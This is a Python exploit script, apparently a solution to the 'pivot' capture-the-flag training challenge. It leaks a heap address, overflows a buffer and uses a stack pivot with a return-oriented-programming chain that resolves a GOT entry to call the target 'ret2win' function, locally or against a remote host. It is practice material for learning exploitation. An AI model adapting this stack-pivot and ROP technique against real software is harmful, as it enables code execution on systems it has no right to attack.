#!/usr/bin/python3
from pwncus import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./pivot', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*pwnme+182
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():
    # Offsets/Address
    ret2win_offset = 0x000000000000a81
    foothold_offset = 0x00000000000096a
    offset = ret2win_offset - foothold_offset
    foothold_plt = exe.plt['foothold_function']
    foothold_got = exe.got['foothold_function']

    # Gadgets
    xchg_rax = 0x00000000004009bd
    pop_rax = 0x00000000004009bb
    add_rax_rbp = 0x00000000004009c4
    pop_rbp = 0x00000000004007c8
    def_rax = 0x00000000004009c0
    call_rax = 0x00000000004006b0

    ru(b'pivot: ')
    malloc_addr = hexleak(rl())
    slog('Leak',malloc_addr)

    pivot_payload = flat(
        foothold_plt, # Call foothold_function to populate the GOT
        pop_rax,      # Pop the GOT address of foothold_function into rax
        foothold_got,
        def_rax,      # mov rax, qword ptr [rax]
        pop_rbp,      # Pop the offset between foothold_function and ret2win into rbp
        offset,
        add_rax_rbp,  # add rax, rbp (calculate the address of ret2win)
        call_rax,     # call rax (call ret2win)
        )

    overflow = flat(
        'A' * 40,
        pop_rax,
        malloc_addr,
        xchg_rax,
        )

    sla(b'> ', pivot_payload)
    sla(b'> ',overflow)

    interactive()

if __name__ == '__main__':
    exploit()
